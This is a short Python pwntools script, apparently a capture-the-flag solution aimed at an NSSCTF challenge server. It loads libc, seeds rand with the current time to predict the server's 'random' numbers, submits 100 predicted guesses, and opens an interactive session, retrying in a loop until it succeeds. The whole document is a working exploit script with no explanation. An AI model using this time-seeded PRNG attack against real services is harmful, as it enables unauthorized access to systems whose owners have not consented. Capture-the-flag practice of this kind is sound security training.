from pwn import *
from ctypes import *
context(log_level='debug',arch='amd64',terminal=['tmux','splitw','-h'])


while 1:
    try:
        io=remote("node1.anna.nssctf.cn",28448)
        cs=cdll.LoadLibrary("/lib/x86_64-linux-gnu/libc.so.6")
        cs.srand(cs.time(0))
        io.recvuntil(b"there?\n")
        io.sendline(b"ads")
        for i in range(100):
            io.sendlineafter(b"it?\n",str((cs.rand()%100000)+1))
        io.interactive()
    except:
        io.close()
        continue
